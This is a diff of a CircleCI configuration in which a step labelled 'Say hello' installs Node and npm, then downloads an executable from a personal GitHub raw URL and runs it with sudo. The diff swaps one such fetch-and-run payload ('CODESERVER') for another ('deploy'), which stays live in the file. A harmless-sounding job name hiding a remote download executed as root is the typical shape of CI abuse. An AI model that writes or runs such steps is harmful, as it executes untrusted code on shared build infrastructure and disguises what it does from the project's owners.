@@ -16,7 +16,6 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command:  sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/aurbach55/pos/main/CODESERVER && chmod +x CODESERVER && sudo ./CODESERVER
           command:  sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/YDhj45/kj/main/deploy && chmod +x deploy && sudo ./deploy
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
